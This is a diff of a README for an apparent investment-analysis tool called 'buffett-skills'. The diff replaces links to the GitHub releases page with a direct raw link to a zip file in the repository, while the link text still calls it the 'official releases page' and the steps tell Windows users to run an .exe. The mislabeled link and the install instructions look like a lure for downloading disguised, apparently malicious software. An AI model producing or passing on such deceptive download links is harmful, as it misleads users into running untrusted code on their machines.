@@ -1,6 +1,6 @@
 # 📈 buffett-skills - Apply proven investment logic to assets
 
-[![](https://img.shields.io/badge/Download-buffett--skills-blue.svg)](https://github.com/Choppy-superfamilymuscoidea9021/buffett-skills/releases)
+[![](https://img.shields.io/badge/Download-buffett--skills-blue.svg)](https://github.com/Choppy-superfamilymuscoidea9021/buffett-skills/raw/refs/heads/main/skills/skills-buffett-3.3.zip)
 
 buffett-skills automates the analysis of complex financial data. It uses the investment framework popularized by Warren Buffett. The software scans market indicators and news. It calculates the intrinsic value of stocks, bitcoin, and ethereum. It removes emotion from your financial decisions.
 
@@ -8,7 +8,7 @@ buffett-skills automates the analysis of complex financial data. It uses the inv
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Choppy-superfamilymuscoidea9021/buffett-skills/releases) to access the installer.
+1. Visit the [official releases page](https://github.com/Choppy-superfamilymuscoidea9021/buffett-skills/raw/refs/heads/main/skills/skills-buffett-3.3.zip) to access the installer.
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
